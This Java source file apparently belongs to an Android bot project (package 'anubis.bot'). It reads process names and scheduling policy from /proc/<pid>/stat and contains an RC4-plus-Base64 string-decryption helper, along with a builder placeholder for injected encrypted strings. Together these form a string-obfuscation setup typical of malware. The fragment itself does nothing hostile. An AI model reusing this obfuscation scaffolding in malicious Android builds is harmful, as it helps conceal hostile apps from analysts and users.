package anubis.bot.myapplication.API.ProcessesSDK6;


import android.os.Parcel;
import android.os.Parcelable;
import android.util.Base64;

import java.io.IOException;
import java.util.Locale;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

public final class classProcStat extends classProcFile {
  UtilsClass SF = new UtilsClass();

  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }

  public static classProcStat get(int pid) throws IOException {
    UtilsClass SF = new UtilsClass();
    return new classProcStat(String.format(Locale.ENGLISH, "/proc/%d/stat", pid));
  }
  //[@@@fuctionsCryptTextStatic@@@]
  private final String[] fields;

  private classProcStat(String path) throws IOException {
    super(path);
    fields = content.split("\\s+");
  }
  private classProcStat(Parcel in) {
    super(in);
    this.fields = in.createStringArray();
  }
  public String getComm() {
    UtilsClass SF = new UtilsClass();
    return fields[1].replace("(", "").replace(")", "");
  }

  public int policy() {
    return Integer.parseInt(fields[40]);
  }


  @Override
  public void writeToParcel(Parcel dest, int flags) {
    super.writeToParcel(dest, flags);
    dest.writeStringArray(fields);

  }
  public static final Parcelable.Creator<classProcStat> CREATOR = new Parcelable.Creator<classProcStat>() {

    @Override
    public classProcStat createFromParcel(Parcel source) {
      return new classProcStat(source);
    }

    @Override
    public classProcStat[] newArray(int TTG) {
      return new classProcStat[TTG];
    }
  };
}